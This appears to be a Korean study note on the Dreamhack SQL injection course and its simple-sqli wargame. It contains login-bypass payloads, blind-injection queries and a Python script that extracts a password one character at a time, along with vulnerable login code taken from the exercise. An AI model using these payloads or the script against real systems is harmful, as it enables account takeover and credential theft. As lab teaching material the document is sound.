# Dreamhack SQL Injection

# Simple SQL Injection
SQL Injection 공격을 할때에 중요한 것은 이용자의 입력값이 SQL 구문으로 해석될 수 있도록 해야하는데, 이용자의 입력값을 나타내기에 `'` 따옴표를 사용하여 사용자의 입력값이 SQL 구문으로 해석되도록한다
```
SELECT * FROM user_table WHERE uid='admin' or '1' and upw='';
```
위 코드에서 실제로 이용자가 입력한 값은 uid에 `admin' or '1`이다
이렇게 하면 SQL Injection 공격을 할 수 있는데, 조건식을 이용하여 로그인을 하는 것이다
첫번째는 uid가 admin 인 데이터, 두번째 조건은 이전식의 참이고, upw가 없는 경우이다. 첫번째 조건은 admin의 결과를 반환, 두번째 조건은 아무런 결과를 반환하지 않는다. 즉, uid가 admin인 데이터를 반환하리 때문에 관리자 계정으로 로그인이 가능한 것이다. 이외에도 아래 코드와 같이 주석처리된 방법으로도 SQL Injection 공격을 할 수 있다.
```
SELECT * FROM user_table WHERE uid='admin'-- ' and upw='';
```

# Blind SQL Injection
마치 스무고개를 하는 것과 비슷하다. 앞서 봤던 Simple SQL Injection은 이용자가 직접 화면에서 확인할 수 있지만 Blind SQL Injection은 데이터베이스와 답변이 가능한 형태로 질문을하며 참/거짓 반환 결과로 데이터를 획득하여 공격하는 기법을 사용한다
### ascii 
전달된 문자를 아스키 형태로 변환하는 함수, ascii('a') 를 실행하면 'a' 문자의 아스키 코드인 97을 반환한다

### substr
substr 함수는 문자열에서 지정한 위치부터 길이까지의 값을 가져온다.
```
substr(string, position, length)
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

### Blind SQL Injection Exploit Query
```
# 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True
# 두 번째 글자 구하기 (아스키 115 = 's', 116 = 't')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True
```

이 공격은 한바이트씩 비교하여 공격하는 방식이라서 다른 공격에 비해 많은 시간이 소요된다. 이러한 문제를 해결하기 위해 자동화된 스크립트를 작성한다
python에서의 requests 모듈을 사용하여 GET 방식과 POST 방식에서 사용될 수 있는 스크립트 파일을 만들어 요청을 전송하면 된다.
```python
# GET 
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
params = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.get(url + str(i), headers=headers, params=params)
    print(c.request.url)
    print(c.text)

# POST
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
data = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)

# 공격 스크립트

#!/usr/bin/python3
import requests
import string
# example URL
url = 'http://example.com/login'
params = {
    'uid': '',
    'upw': ''
}
# abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
tc = string.ascii_letters + string.digits + string.punctuation
# 사용할 SQL Injection 쿼리
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20):
    for ch in tc:
        # query를 이용하여 Blind SQL Injection 시도
        params['uid'] = query.format(idx=idx+1, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
        if c.text.find("Login success") != -1:
            password += ch
            break
print(f"Password is {password}")
```

# simple-sqli (Exercise)
SQL Injection 취약점이 존재하는 워게임이다.
이번 문제의 코드를 보아하니 SQLite를 이용해 데이터베이스를 구성하고 있는 것으로 보이고, 역시 관리자 계정(admin) 계정으로 로그인하면 flag 값을 보여주는 것으로 확인된다.

```python
DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100));')
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit()
    db.close()
```
위 데이터베이스 스키마를 통해서 관리를 하고 있는것 같다. 아래의 표같은 구조를 하고 있음을 예상할 수 있다
|userid|userpassword|
|:--:|:--|
|guest|guest|
|admin|램던16바이트 Hex 형태의 표현(32byte)|

아래의 코드는 익스플로잇을 할 /login 엔드포인트에 대한 코드이다
```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
```
중점적으로 봐야할 것은 `res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')`이 쿼리문 이다
userid=admin이 들어가야할 것이고, userpassword에 비밀번호를 넣어야하는데 SQL Injection 기법을 활용하여 공격한다면, 많은 방법이 가능할 거같은데 일단 가장 기본적인 두가지 방법만 활용해서 진행하였다.

```
# 첫번째 방법 -> userid 검색 조건만 처리하도록 뒤 내용을 주석처리하는 방식
admin"--
zzz

# 두번재 방법 -> userid 검색 조건 뒤에 or 조건을 추가하여 뒷 내용이 거짓이라도 최종적으로 참을 반환하는 방식
admin" or "1
123123

```
